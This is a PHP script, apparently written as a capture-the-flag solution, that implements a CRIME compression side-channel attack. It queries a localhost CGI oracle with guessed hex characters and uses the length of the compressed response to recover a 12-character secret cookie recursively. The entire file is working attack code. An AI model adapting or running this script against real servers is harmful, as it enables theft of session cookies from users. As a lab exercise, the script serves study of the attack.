<?php

/**
 * Simple implementation of a crime attack against a ctf challenge. Uses compression to steal the cookie.
 * Author Tobias Petrasch <petrasch@bdp-software.com>
 */

/**
 * Just a helper function for strings. Gets the string between two delimiters.
 */
function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

/**
 * Method that sends a request to the server and calculates the length of the string.
 */
function sendRequest($url_param) {
	$url = 'http://localhost:8000/cgi-bin/ctf-crime-oracle?matrikelnummer=123456789&url={f='.$url_param;
	$ch = curl_init();
	$timeout = 100000;
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	$data = curl_exec($ch);
	curl_close($ch);
	return strlen(get_string_between($data,'<!--START-->','<!--END-->'));
}


$index = 0;
$shortestLength = 170;
$tmp = '';
$list = [];

/**
 * Recursive attack function that uses the length of the compressed content to determine if we guess the right cookie.
 */
function attack($string) {
	
	$zeichen = ['a','b','c','d','e','f','0','1','2','3','4','5','6','7','8','9'];
	
	if (strlen($string) == 12) {
		return "";
	}

	$possibilities = [];
	
	foreach ($zeichen as $z) {	
		$length = sendRequest($string.$z);

		echo "Testing " . $string.$z . ". Has length " . $length . "\n";
		
		if ($length < 170) {
			$tmp = $string.$z;
			$possibilities[] = $z;
		}
	}

	if(count($possibilities) == 0) {
		return "";
	}
	
	if (count($possibilities) > 1) {
		
		// choose the right one..
		$attack0 = attack($string.$possibilities[0]);
		$shortest = strlen($attack0);
	
		for ($i=1;$i<count($possibilities);$i++) {
			$attack = attack($string.$possibilities[$i]);
			if ($shortest < strlen($attack)) {
				return $possibilities[$i] . $attack;
			}
		}

		return $possibilities[0] . $attack0;
	}
	
	return $possibilities[0] . attack($string.$possibilities[0]);
}

//Finally the result.
echo "RESULT: " . attack($tmp);
